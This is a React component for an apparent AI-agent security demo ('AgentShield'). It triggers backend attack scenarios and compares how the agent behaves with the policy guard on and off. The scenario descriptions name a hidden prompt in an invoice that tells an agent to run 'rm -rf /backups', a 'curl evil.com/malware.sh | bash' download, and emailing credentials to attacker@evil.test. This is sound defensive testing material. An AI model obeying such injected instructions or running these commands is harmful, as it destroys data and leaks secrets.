"use client";

import { useState } from "react";
import {
  FileText,
  Mail,
  KeyRound,
  ShieldAlert,
  Terminal,
  Cpu,
  Loader2,
  ArrowRight,
  ShieldCheck,
  ShieldOff,
  AlertTriangle,
  Layers,
  CheckCircle2,
  XCircle,
} from "lucide-react";
import type { TelemetryEvent } from "@/types/telemetry";
import { adaptBackendToTelemetry } from "@/lib/telemetry-adapter";
import { BACKEND_URL } from "@/lib/api-config";
import { toast } from "sonner";

interface AttackPlaygroundProps {
  onAttackDispatched: (events: TelemetryEvent[]) => void;
}

export interface BackendAttackScenario {
  id: string;
  name: string;
  category: string;
  badge: string;
  subtext: string;
  targetTool: string;
  expectedRule: string;
  isApproval?: boolean;
}

const BACKEND_SCENARIOS: BackendAttackScenario[] = [
  {
    id: "poisoned_invoice",
    name: "Poisoned Invoice Injection",
    category: "Prompt-injected content",
    badge: "Indirect Injection",
    subtext: "Hidden prompt in invoice instructs agent to delete system backups (rm -rf /backups).",
    targetTool: "read_document -> execute_bash",
    expectedRule: "R-TAINT-01",
  },
  {
    id: "email_leak",
    name: "Email Data Exfiltration",
    category: "Data exfiltration egress",
    badge: "Egress Exfil",
    subtext: "Adversary prompt tricks agent into emailing credentials to attacker@evil.test.",
    targetTool: "read_document -> send_email",
    expectedRule: "R-EGRESS-01",
  },
  {
    id: "sensitive_data",
    name: "Sensitive Vault Access",
    category: "Unauthorized sensitive-data request",
    badge: "Vault Leak",
    subtext: "Low-privilege marketing worker attempts to read enterprise_vault/credentials.env.",
    targetTool: "read_document",
    expectedRule: "R-SENSITIVE-01",
  },
  {
    id: "privilege_escalation",
    name: "Privilege Escalation",
    category: "Tool invocation beyond permission",
    badge: "RBAC Breach",
    subtext: "Standard support agent attempts to invoke admin root key rotation tool.",
    targetTool: "rotate_encryption_keys",
    expectedRule: "R-RBAC-01",
  },
  {
    id: "shadow_tool",
    name: "Rogue Shadow Tool",
    category: "Signed tool metadata integrity",
    badge: "Manifest Integrity",
    subtext: "Attacker attempts to register and invoke an unsigned shadow tool into the agent loop.",
    targetTool: "unregistered_shadow_tool",
    expectedRule: "R-REG-01",
  },
  {
    id: "destructive_shell",
    name: "Destructive Shell Execution",
    category: "High-impact destructive command",
    badge: "Shell Guard",
    subtext: "Remote payload download and execution attempt (curl evil.com/malware.sh | bash).",
    targetTool: "execute_bash",
    expectedRule: "R-BASH-01",
  },
  {
    id: "legitimate_approval",
    name: "Human Safety Gate (HITL)",
    category: "High-impact administrator tool",
    badge: "HITL Quarantine",
    subtext: "High-risk production action quarantined for manual confirmation by SOC_ADMIN_01.",
    targetTool: "rotate_encryption_keys",
    expectedRule: "R-HUMAN-APPROVE",
    isApproval: true,
  },
];

interface ExecutionResult {
  scenarioId: string;
  scenarioName: string;
  shield_enabled: boolean;
  neutralized?: boolean;
  compromised?: boolean;
  steps: Array<{
    call_id?: string;
    tool_name?: string;
    arguments?: any;
    decision?: string;
    rule_id?: string;
    risk_score?: number;
    output?: string;
    status?: string;
    reason?: string;
  }>;
}

export default function AttackPlayground({ onAttackDispatched }: AttackPlaygroundProps) {
  const [shieldEnabled, setShieldEnabled] = useState<boolean>(true);
  const [activeDeployingId, setActiveDeployingId] = useState<string | null>(null);
  const [lastExecution, setLastExecution] = useState<ExecutionResult | null>(null);
  const [networkError, setNetworkError] = useState<string | null>(null);

  const handleLaunchAttack = async (scenario: BackendAttackScenario) => {
    setActiveDeployingId(scenario.id);
    setNetworkError(null);

    try {
      let endpoint = `${BACKEND_URL}/api/attacks/${scenario.id}?shield_enabled=${shieldEnabled}`;
      if (scenario.id === "legitimate_approval") {
        // Without auto_resolve so it triggers real pending approval on backend
        endpoint = `${BACKEND_URL}/api/attacks/${scenario.id}?shield_enabled=true`;
      }

      const res = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      });

      if (!res.ok) {
        const errDetail = await res.text();
        throw new Error(`HTTP ${res.status}: ${errDetail || "Backend error"}`);
      }

      const data = await res.json();

      const execResult: ExecutionResult = {
        scenarioId: scenario.id,
        scenarioName: scenario.name,
        shield_enabled: shieldEnabled,
        neutralized: data.neutralized,
        compromised: data.compromised,
        steps: data.steps || [],
      };
      setLastExecution(execResult);

      // Map steps to telemetry events and feed them to the parent stream
      const mappedEvents: TelemetryEvent[] = [];
      if (Array.isArray(data.steps)) {
        for (const step of data.steps) {
          const adapted = adaptBackendToTelemetry({
            ...step,
            timestamp: new Date().toISOString(),
          });
          if (adapted) {
            mappedEvents.push(adapted);
          }
        }
      }

      if (mappedEvents.length > 0) {
        onAttackDispatched(mappedEvents);
      }

      if (scenario.isApproval) {
        toast.warning("Quarantine Triggered", {
          description: "High-impact tool quarantined for manual human confirmation in HITL Gate.",
        });
      } else if (shieldEnabled) {
        toast.error(`Attack Intercepted [${scenario.expectedRule}]`, {
          description: `Policy Enforcement Point halted attack at hop ${data.steps?.length || 1}.`,
          icon: <ShieldAlert className="h-4 w-4 text-crimson" />,
        });
      } else {
        toast.warning("Baseline Compromise (Shield OFF)", {
          description: `Attack executed completely with NO policy guardrails.`,
          icon: <ShieldOff className="h-4 w-4 text-amber-400" />,
        });
      }
    } catch (err: any) {
      console.error("[Playground] Error dispatching attack:", err);
      const msg = `Backend connection failed: ${err.message || String(err)}. Ensure FastAPI is running on ${BACKEND_URL}.`;
      setNetworkError(msg);
      toast.error("FastAPI Backend Offline", {
        description: msg,
      });
    } finally {
      setActiveDeployingId(null);
    }
  };

  return (
    <div
      className="bg-charcoal border border-forest rounded-xl p-4 sm:p-5 shadow-[0_4px_25px_rgba(6,17,12,0.9)] font-mono relative overflow-hidden"
      style={{
        boxShadow: "0 0 25px rgba(6, 17, 12, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.03)",
      }}
    >
      {/* Background ambient flare */}
      <div className="absolute top-0 right-0 w-80 h-80 rounded-full blur-3xl pointer-events-none bg-crimson/10" />

      {/* Header and Shield Toggle Controls */}
      <div className="flex flex-wrap items-center justify-between gap-3 mb-4 pb-3 border-b border-neutral-800/80">
        <div>
          <div className="flex items-center gap-2">
            <h3 className="text-sm font-bold text-neutral-100 uppercase tracking-wider flex items-center gap-2">
              <Terminal className="h-4 w-4 text-crimson" />
              Live Attack Simulator
            </h3>
            <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-forest text-emerald-400 border border-emerald-900/60 uppercase">
              FastAPI :8000
            </span>
          </div>
          <p className="text-[11px] text-neutral-400 mt-0.5">
            Compare attack execution between Protected Mode (Shield ON) and Vulnerable Baseline (Shield OFF).
          </p>
        </div>

        {/* Global Shield Switch */}
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2 bg-neutral-900 px-3 py-1.5 rounded-lg border border-neutral-800">
            <span className="text-[11px] font-semibold text-neutral-300">
              AgentShield:
            </span>
            <button
              onClick={() => setShieldEnabled(!shieldEnabled)}
              className={`flex items-center gap-1.5 px-3 py-1 rounded text-xs font-bold uppercase tracking-wider transition-all cursor-pointer ${
                shieldEnabled
                  ? "bg-forest border border-emerald-800 text-emerald-300 shadow-[0_0_10px_rgba(6,17,12,0.8)]"
                  : "bg-crimson/25 border border-crimson text-red-300 shadow-[0_0_10px_rgba(163,28,24,0.3)]"
              }`}
            >
              {shieldEnabled ? (
                <>
                  <ShieldCheck className="h-3.5 w-3.5 text-emerald-400" />
                  <span>Shield ON</span>
                </>
              ) : (
                <>
                  <ShieldOff className="h-3.5 w-3.5 text-crimson" />
                  <span>Shield OFF</span>
                </>
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Network Error Banner (Acceptance: backend down shows real error, NOT fake pending) */}
      {networkError && (
        <div className="mb-4 p-3 rounded-lg bg-crimson/20 border border-crimson text-red-200 flex items-start gap-2.5 text-xs">
          <AlertTriangle className="h-4 w-4 text-crimson flex-shrink-0 mt-0.5" />
          <div>
            <span className="font-bold uppercase tracking-wider text-white">Backend Offline Error: </span>
            <span>{networkError}</span>
          </div>
        </div>
      )}

      {/* Grid of Backend Scenarios */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3">
        {BACKEND_SCENARIOS.map((scenario) => {
          const isDeploying = activeDeployingId === scenario.id;

          return (
            <div
              key={scenario.id}
              className="bg-neutral-900/80 border border-neutral-800 hover:border-neutral-700 rounded-xl p-3.5 flex flex-col justify-between transition-all group relative overflow-hidden"
            >
              <div>
                <div className="flex items-center justify-between gap-1 mb-2">
                  <span className="px-2 py-0.5 rounded text-[10px] font-semibold bg-forest text-emerald-400 border border-emerald-900/60 uppercase">
                    {scenario.badge}
                  </span>
                  <span className="text-[10px] font-mono text-neutral-500">
                    {scenario.expectedRule}
                  </span>
                </div>

                <h4 className="text-xs font-bold text-neutral-100 group-hover:text-red-200 transition-colors">
                  {scenario.name}
                </h4>

                <p className="text-[11px] text-neutral-400 mt-1 leading-relaxed">
                  {scenario.subtext}
                </p>

                <div className="mt-2 text-[10px] text-neutral-500 font-mono">
                  Target: <span className="text-neutral-400">{scenario.targetTool}</span>
                </div>
              </div>

              <div className="mt-4 pt-2.5 border-t border-neutral-800/80 flex items-center justify-between">
                <span className="text-[10px] text-neutral-500">
                  {shieldEnabled ? "Test Intercept" : "Test Baseline"}
                </span>

                <button
                  onClick={() => handleLaunchAttack(scenario)}
                  disabled={isDeploying}
                  className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold uppercase tracking-wider active:scale-[0.97] transition-all duration-100 cursor-pointer disabled:opacity-50 ${
                    scenario.isApproval
                      ? "bg-forest border border-emerald-800 text-emerald-300 hover:bg-forest/80 shadow-[0_0_10px_rgba(6,17,12,0.8)]"
                      : shieldEnabled
                      ? "bg-crimson text-white hover:bg-red-800 shadow-[0_0_12px_rgba(163,28,24,0.35)]"
                      : "bg-neutral-800 border border-neutral-700 text-amber-300 hover:bg-neutral-700"
                  }`}
                >
                  {isDeploying ? (
                    <>
                      <Loader2 className="h-3.5 w-3.5 animate-spin" />
                      <span>Running...</span>
                    </>
                  ) : (
                    <>
                      <span>Run Test</span>
                      <ArrowRight className="h-3.5 w-3.5" />
                    </>
                  )}
                </button>
              </div>
            </div>
          );
        })}
      </div>

      {/* Multi-Hop Steps Renderer (Brochure Mandate: render steps[] with rule_id, decision, output) */}
      {lastExecution && (
        <div className="mt-4 pt-4 border-t border-neutral-800/80 bg-black/40 rounded-xl p-3.5 border border-forest">
          <div className="flex flex-wrap items-center justify-between gap-2 mb-3">
            <div className="flex items-center gap-2">
              <Layers className="h-4 w-4 text-emerald-400" />
              <span className="text-xs font-bold uppercase tracking-wider text-neutral-200">
                Execution Telemetry: {lastExecution.scenarioName}
              </span>
              <span
                className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase ${
                  lastExecution.shield_enabled
                    ? "bg-forest text-emerald-400 border border-emerald-900/60"
                    : "bg-crimson/30 text-red-300 border border-crimson"
                }`}
              >
                Shield {lastExecution.shield_enabled ? "ON" : "OFF"}
              </span>
            </div>

            <span className="text-[11px] text-neutral-400 font-mono">
              Total Steps: <strong className="text-neutral-200">{lastExecution.steps.length}</strong>
            </span>
          </div>

          <div className="space-y-2">
            {lastExecution.steps.map((step, idx) => {
              const isDeny = step.decision === "DENY";
              const isBypass = step.decision === "SHIELD_BYPASS" || step.status === "COMPROMISED";
              const isAllow = step.decision === "ALLOW";

              return (
                <div
                  key={step.call_id || idx}
                  className={`p-2.5 rounded-lg border text-xs font-mono transition-all ${
                    isDeny
                      ? "bg-crimson/15 border-crimson/60 text-red-200"
                      : isBypass
                      ? "bg-amber-950/20 border-amber-800/60 text-amber-200"
                      : "bg-forest/60 border-emerald-900/60 text-emerald-200"
                  }`}
                >
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-1">
                    <div className="flex items-center gap-2">
                      <span className="font-bold text-neutral-300">
                        Hop {idx + 1}:
                      </span>
                      <span className="font-bold text-white">
                        {step.tool_name}
                      </span>
                      {step.rule_id && (
                        <span className="px-1.5 py-0.2 rounded text-[10px] font-bold bg-black/60 border border-neutral-700 text-neutral-300">
                          {step.rule_id}
                        </span>
                      )}
                    </div>

                    <div className="flex items-center gap-2">
                      {isDeny ? (
                        <span className="inline-flex items-center gap-1 text-[11px] font-bold text-crimson bg-black/50 px-2 py-0.5 rounded border border-crimson/50">
                          <XCircle className="h-3 w-3" />
                          DENIED
                        </span>
                      ) : isBypass ? (
                        <span className="inline-flex items-center gap-1 text-[11px] font-bold text-amber-400 bg-black/50 px-2 py-0.5 rounded border border-amber-500/50">
                          <AlertTriangle className="h-3 w-3" />
                          COMPROMISED (NO SHIELD)
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 text-[11px] font-bold text-emerald-400 bg-black/50 px-2 py-0.5 rounded border border-emerald-900/60">
                          <CheckCircle2 className="h-3 w-3" />
                          ALLOWED
                        </span>
                      )}
                    </div>
                  </div>

                  <div className="text-[11px] text-neutral-400 mb-1">
                    Args: <span className="text-neutral-300">{JSON.stringify(step.arguments)}</span>
                  </div>

                  {step.output && (
                    <div className="text-[11px] text-neutral-400 mt-1 pt-1 border-t border-white/5 truncate">
                      Output: <span className="text-neutral-200">{step.output}</span>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}
